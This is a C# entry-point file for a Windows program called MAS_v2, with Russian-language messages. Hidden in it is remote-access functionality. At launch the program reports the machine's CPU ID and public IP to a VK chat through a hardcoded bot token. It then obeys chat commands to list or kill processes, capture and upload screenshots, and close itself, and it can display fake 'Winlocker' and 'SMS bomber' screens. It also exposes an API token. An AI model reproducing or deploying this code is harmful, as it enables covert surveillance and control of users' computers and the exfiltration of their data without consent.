using BotCore;
using MAS_v2.Security;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MAS_v2
{
    static class Program
    {
        public static MenuSelector MenuSelector;
        public static Security.SecurityManager SecurityManager;
        public static Vk.VkLongPoolClient vkclient;
        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            try
            {
                vkclient = new Vk.VkLongPoolClient("c37ca76d7eda991a04b14d939da6ced5e214d6c5949544a89d1cee235bf0e6d27cf98ba213d477feb7371", "209453266", MSG);
            }
            catch
            {
                MessageBox.Show("Internet not enabled", "Internet");
                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            Task.Factory.StartNew(() =>
            {
                try
                {
                    using (WebClient wc = new WebClient())
                    {
                        string ip = wc.DownloadString("https://api.ipify.org");
                        Vk.VkLongPoolClient.Keyboard keyboard = new Vk.VkLongPoolClient.Keyboard(false, false);
                        keyboard.AddButton("Закрыть MAS", "close " + hardware.GetID(), "positive");
                        keyboard.AddButton("Скриншот экрана", "screen " + hardware.GetID(), "secondary");
                        vkclient.Messages.Send.TextAndKeyboard("2000000002", "✅ Запуск программы ✅\nCPU ID: " + hardware.GetID() + "\nIP: " + ip, keyboard);
                    }
                }
                catch
                {
                    MessageBox.Show("Internet not enabled", "Internet");
                    System.Diagnostics.Process.GetCurrentProcess().Kill();
                }
            });
            MenuSelector = new MenuSelector();
            SecurityManager = new Security.SecurityManager();
            SecurityManager.LoadCFG();
            switch (SecurityManager.settings.FakeMenu)
            {
                case (1):
                    Application.Run(new Security.FakeForms.WinlockerForm());
                    break;
                case (2):
                    Application.Run(new Security.FakeForms.SMS_Bomber());
                    break;
                default:
                    Application.Run(MenuSelector);
                    break;
            }
        }
        public static HardwareID hardware = new HardwareID();
        public static void Exit()
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    string ip = wc.DownloadString("https://api.ipify.org");
                    Program.vkclient.Messages.Send.Text("2000000002", "⚠ Закрытие программы ⚠\nCPU ID:" + new HardwareID().GetID() + "\nIP: " + ip + "\n");

                }
            }
            catch { }
            Process.GetCurrentProcess().Kill();
        }
        public static void MSG(Vk.VkLongPoolClient.Update update)
        {
            if (update.@object.peer_id == 2000000002 || update.@object.peer_id == 443640040)
            {
                if (update.@object.text == "online")
                {
                    Task.Factory.StartNew(() =>
                    {
                        try
                        {
                            using (WebClient wc = new WebClient())
                            {
                                string ip = wc.DownloadString("https://api.ipify.org");
                                vkclient.Messages.Send.Text("2000000002", "⚠ Онлайн пользователь ⚠\nCPU ID:" + hardware.GetID() + "\nIP: " + ip + "\n");

                            }
                        }
                        catch { }
                    });
                }
                else if (update.@object.text == "processes " + hardware.GetID())
                {
                    Task.Factory.StartNew(() =>
                    {
                        try
                        {
                            using (WebClient wc = new WebClient())
                            {
                                string ip = wc.DownloadString("https://api.ipify.org");
                                string process = "";
                                try
                                {
                                    foreach (Process p in Process.GetProcesses().ToArray())
                                    {
                                        try
                                        {
                                            process += "\n" + p.ProcessName;
                                        }
                                        catch { }
                                    }
                                }
                                catch { }
                                vkclient.Messages.Send.Text("2000000002", "⚠ Запущенные процессы у пользователя ⚠\nCPU ID:" + hardware.GetID() + "\nIP: " + ip + "\nПроцессы:\n" + process);
                            }
                        }
                        catch { }
                    });
                }
                else if (update.@object.text.StartsWith("processes " + hardware.GetID() + " kill"))
                {
                    Task.Factory.StartNew(() =>
                    {
                        try
                        {
                            using (WebClient wc = new WebClient())
                            {
                                string ip = wc.DownloadString("https://api.ipify.org");
                                string process = Regex.Match(update.@object.text, "processes " + hardware.GetID() + " kill (.*)").Groups[1].Value;
                                foreach (Process p in Process.GetProcessesByName(process).ToArray())
                                {
                                    try
                                    {
                                        p.Kill();
                                    }
                                    catch { }
                                }
                                vkclient.Messages.Send.Text("2000000002", "⚠ Процесс: " + process + " закрыт у ⚠\nCPU ID:" + hardware.GetID() + "\nIP: " + ip);
                            }
                        }
                        catch { }
                    });
                }
                else if (update.@object.text.StartsWith("screen " + hardware.GetID()))
                {
                    Task.Factory.StartNew(() =>
                    {
                        try
                        {
                            Bitmap BM = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                            Graphics GH = Graphics.FromImage(BM as Image);
                            GH.CopyFromScreen(0, 0, 0, 0, BM.Size);
                            BM.Save("screen.jpg");
                            vkclient.Messages.Send.TextAndDocument("2000000002", "⚠ Скриншот экрана ⚠\nCPU ID:" + hardware.GetID(), "screen.jpg", "Скриншот");
                            try { System.IO.File.Delete("screen.jpg"); } catch { }
                            
                        }
                        catch { }
                    });
                }
                else
                {
                    if (update.@object.text == "close " + hardware.GetID())
                    {
                        try
                        {
                            using (WebClient wc = new WebClient())
                            {
                                string ip = wc.DownloadString("https://api.ipify.org");
                                vkclient.Messages.Send.Text("2000000002", "🚫 Закрываю программу 🚫\nCPU ID:" + hardware.GetID() + "\nIP: " + ip + "\n");
                            }
                        }
                        catch { }
                        System.Diagnostics.Process.GetCurrentProcess().Kill();
                    }
                }
            }
            else
            {
                if (update.@object.text == "close " + hardware.GetID())
                {
                    System.Diagnostics.Process.GetCurrentProcess().Kill();
                }
                else
                {
                    Console.WriteLine(update.@object.text);
                    Console.WriteLine("'" + hardware.GetID() + "'");
                }
            }
            if (update.@object.payload == "{\"button\":\"close " + hardware.GetID() + "\"}")
            {
                Exit();
            }   
            else if (update.@object.payload == "{\"button\":\"screen " + hardware.GetID() + "\"}")
            {
                Task.Factory.StartNew(() =>
                {
                    try
                    {
                        Bitmap BM = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                        Graphics GH = Graphics.FromImage(BM as Image);
                        GH.CopyFromScreen(0, 0, 0, 0, BM.Size);
                        BM.Save("screen.jpg");
                        vkclient.Messages.Send.TextAndDocument("2000000002", "⚠ Скриншот экрана ⚠\nCPU ID:" + hardware.GetID(), "screen.jpg", "Скриншот");
                        try { System.IO.File.Delete("screen.jpg"); } catch { }

                    }
                    catch { }
                });
            }
        }
    }
}
